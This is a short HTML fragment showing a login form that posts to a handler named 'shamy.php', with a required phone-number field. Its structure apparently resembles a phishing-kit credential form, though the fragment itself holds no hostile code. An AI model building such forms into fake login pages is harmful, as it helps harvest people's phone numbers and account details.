...
<form action="shamy.php" id="formLogin" onsubmit="open_my_account();" method="post">
...
<input type="text" class="verify-input" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
